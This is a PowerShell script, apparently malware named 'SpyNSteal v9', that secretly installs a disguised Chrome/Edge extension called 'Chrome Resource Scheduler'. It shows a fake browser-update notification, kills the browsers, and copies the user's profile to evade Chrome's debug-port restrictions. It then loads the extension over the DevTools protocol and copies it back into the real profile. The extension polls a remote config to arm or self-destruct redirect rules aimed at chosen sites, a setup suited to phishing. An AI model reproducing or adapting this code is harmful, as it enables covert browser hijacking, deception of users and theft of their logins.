# SpyNSteal v9 - CDP Extensions.loadUnpacked via profile copy
# Chrome 136+ blocks --remote-debugging-port on the default profile.
# Solution: copy profile to a temp dir, launch with debug port, load extension
# via CDP Extensions.loadUnpacked, then swap profile back.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

function Test-Port([int]$port) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $ar = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
        $ok = $ar.AsyncWaitHandle.WaitOne(1500)
        if ($ok) { try { $tcp.EndConnect($ar) } catch { $ok = $false } }
        $tcp.Close(); return $ok
    } catch { return $false }
}

function Http-Get([string]$url, [int]$timeoutMs = 3000) {
    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Timeout = $timeoutMs; $req.ReadWriteTimeout = $timeoutMs
        $resp = $req.GetResponse()
        $sr = New-Object IO.StreamReader($resp.GetResponseStream())
        $body = $sr.ReadToEnd(); $sr.Close(); $resp.Close()
        return $body
    } catch { return $null }
}

function Send-WS($ws, [string]$text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $seg = New-Object System.ArraySegment[byte]($bytes, 0, $bytes.Length)
    $task = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
    if (-not $task.Wait(10000)) { return $false }; return $true
}

function Recv-WS($ws, [int]$timeoutMs = 15000) {
    $buf = New-Object byte[] 131072
    $all = New-Object System.Collections.Generic.List[byte]
    $deadline = [DateTime]::Now.AddMilliseconds($timeoutMs)
    do {
        $seg = New-Object System.ArraySegment[byte]($buf, 0, $buf.Length)
        $task = $ws.ReceiveAsync($seg, [System.Threading.CancellationToken]::None)
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { return $null }
        if (-not $task.Wait($remaining)) { return $null }
        for ($i = 0; $i -lt $task.Result.Count; $i++) { $all.Add($buf[$i]) }
    } while (-not $task.Result.EndOfMessage)
    return [Text.Encoding]::UTF8.GetString($all.ToArray())
}

function Invoke-CDP($ws, [int]$id, [string]$method, $params) {
    $cmd = @{ id = $id; method = $method }
    if ($params) { $cmd.params = $params }
    $json = $cmd | ConvertTo-Json -Depth 10 -Compress
    if (-not (Send-WS $ws $json)) { return $null }
    $deadline = [DateTime]::Now.AddSeconds(20)
    while ([DateTime]::Now -lt $deadline) {
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { break }
        $text = Recv-WS $ws $remaining
        if (-not $text) { break }
        try {
            $obj = $text | ConvertFrom-Json
            if ($obj.PSObject.Properties["id"] -and $obj.id -eq $id) { return $obj }
        } catch {}
    }
    return $null
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-Browser($b) {
    for ($k = 0; $k -lt 20; $k++) {
        if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { return $true }
        Get-Process $b.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $b.Proc -EA SilentlyContinue))
}

# ============================================================================
Log "=== SpyNSteal v9 ==="

# Write extension source files
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension at: $extDir"

# Detect browsers
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

# Kill all browser processes
foreach ($b in $browsers) {
    $dead = Kill-Browser $b
    Log "$($b.Proc) killed: $dead"
}
Start-Sleep 1

# Process each browser
$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$port = 9222

Log "--- Processing $($target.Name) ---"

# Step 1: Copy profile to a working directory (Chrome 136+ requirement)
$origProfile = $target.UserData
$workProfile = Join-Path $env:APPDATA "CRSched\profile_work"

if (Test-Path $workProfile) { Remove-Item $workProfile -Recurse -Force -EA SilentlyContinue }

Log "Copying profile (this may take a moment)..."
try {
    # Use robocopy for speed - only copy essential dirs, skip cache
    $rc = Start-Process -FilePath "robocopy" -ArgumentList @(
        "`"$origProfile`"",
        "`"$workProfile`"",
        "/E", "/NFL", "/NDL", "/NJH", "/NJS", "/NP",
        "/XD", "Cache", "Code Cache", "GPUCache", "Service Worker",
        "CacheStorage", "ScriptCache", "GrShaderCache", "ShaderCache",
        "blob_storage", "BrowserMetrics", "Crashpad"
    ) -Wait -NoNewWindow -PassThru
    Log "Robocopy exit: $($rc.ExitCode)"
} catch {
    Log "Robocopy failed: $_ - trying xcopy..."
    try {
        Start-Process -FilePath "xcopy" -ArgumentList @(
            "`"$origProfile`"", "`"$workProfile\`"", "/E", "/I", "/Q", "/Y",
            "/EXCLUDE:$env:TEMP\xcl.txt"
        ) -Wait -NoNewWindow
    } catch { Log "Copy failed: $_" }
}

if (-not (Test-Path (Join-Path $workProfile "Default"))) {
    Log "Profile copy failed - Default folder missing"
    # Relaunch Chrome normally
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (failed) ==="; exit
}
Log "Profile copied to $workProfile"

# Remove singleton locks from the copy
foreach ($f in @("SingletonLock","SingletonSocket","SingletonCookie")) {
    $p = Join-Path $workProfile $f
    if (Test-Path $p) { Remove-Item $p -Force -EA SilentlyContinue }
}

Patch-LocalState $workProfile

# Step 2: Launch Chrome with the copied profile + debug port
Log "Launching with debug port $port..."
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $target.ExePath
$psi.Arguments = "--remote-debugging-port=$port --remote-allow-origins=* --user-data-dir=`"$workProfile`" --no-first-run --disable-background-networking"
$psi.UseShellExecute = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Wait for debug port
$ready = $false
for ($i = 0; $i -lt 20; $i++) {
    Start-Sleep 1
    if (Test-Port $port) {
        $ver = Http-Get "http://127.0.0.1:$port/json/version" 2000
        if ($ver) { $ready = $true; break }
    }
    if ($i % 5 -eq 4) { Log "Waiting for port... ($i)" }
}
if (-not $ready) {
    Log "Debug port failed even with copied profile"
    Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (failed) ==="; exit
}
Log "Debug port $port active"

# Step 3: Connect to browser WebSocket and use Extensions.loadUnpacked
$verJson = Http-Get "http://127.0.0.1:$port/json/version" 3000
$verObj = $verJson | ConvertFrom-Json
$browserWs = $verObj.webSocketDebuggerUrl
Log "Browser WS: $browserWs"

$ws = New-Object System.Net.WebSockets.ClientWebSocket
try {
    $task = $ws.ConnectAsync([Uri]$browserWs, [System.Threading.CancellationToken]::None)
    if (-not $task.Wait(10000)) { Log "WS timeout"; throw "timeout" }
} catch {
    Log "WS connect failed: $_"
    Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (failed) ==="; exit
}
Log "WS connected to browser endpoint"

# Use Extensions.loadUnpacked (Chrome's native CDP method)
$absPath = (Resolve-Path $extDir).Path.Replace('\','/')
Log "Loading extension from: $absPath"

$result = Invoke-CDP $ws 1 "Extensions.loadUnpacked" @{
    path = $absPath
}

$extId = ""
$error2 = ""
if ($result) {
    if ($result.result -and $result.result.id) {
        $extId = $result.result.id
    }
    if ($result.error) {
        $error2 = "$($result.error.message)"
    }
}
Log "Extension ID: $extId"
if ($error2) { Log "Error: $error2" }

# Close WebSocket
try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"", [System.Threading.CancellationToken]::None).Wait() } catch {}
try { $ws.Dispose() } catch {}

# Step 4: Kill the debug Chrome
Start-Sleep 2
Get-Process $target.Proc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
Start-Sleep 2
Log "Debug Chrome killed"

# Step 5: Copy modified profile back (specifically the Default folder prefs + extension data)
if ($extId) {
    Log "Syncing extension data back to real profile..."

    # Copy Secure Preferences and Preferences back
    $srcDefault = Join-Path $workProfile "Default"
    $dstDefault = Join-Path $origProfile "Default"
    foreach ($f in @("Secure Preferences", "Preferences")) {
        $src = Join-Path $srcDefault $f
        $dst = Join-Path $dstDefault $f
        if (Test-Path $src) {
            try { Copy-Item $src $dst -Force; Log "Copied $f back" } catch { Log "Copy $f failed: $_" }
        }
    }

    # Copy extension files
    $srcExtDir = Join-Path $srcDefault "Extensions"
    $dstExtDir = Join-Path $dstDefault "Extensions"
    if (Test-Path $srcExtDir) {
        $extFolder = Join-Path $srcExtDir $extId
        if (Test-Path $extFolder) {
            $dstExtFolder = Join-Path $dstExtDir $extId
            if (Test-Path $dstExtFolder) { Remove-Item $dstExtFolder -Recurse -Force -EA SilentlyContinue }
            try { Copy-Item $extFolder $dstExtFolder -Recurse -Force; Log "Extension files copied" } catch { Log "Ext copy failed: $_" }
        }
    }

    # Copy Local State
    $srcLS = Join-Path $workProfile "Local State"
    $dstLS = Join-Path $origProfile "Local State"
    if (Test-Path $srcLS) {
        try { Copy-Item $srcLS $dstLS -Force; Log "Local State copied" } catch { Log "LS copy failed: $_" }
    }

    Log "Profile sync complete"
} else {
    Log "No extension ID - nothing to sync"
}

# Step 6: Clean up work profile
Remove-Item $workProfile -Recurse -Force -EA SilentlyContinue

# Step 7: Relaunch Chrome normally from real profile
Patch-LocalState $origProfile
Start-Sleep 1
Log "Relaunching Chrome normally..."
Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"

Log "=== Done (extId=$extId) ==="
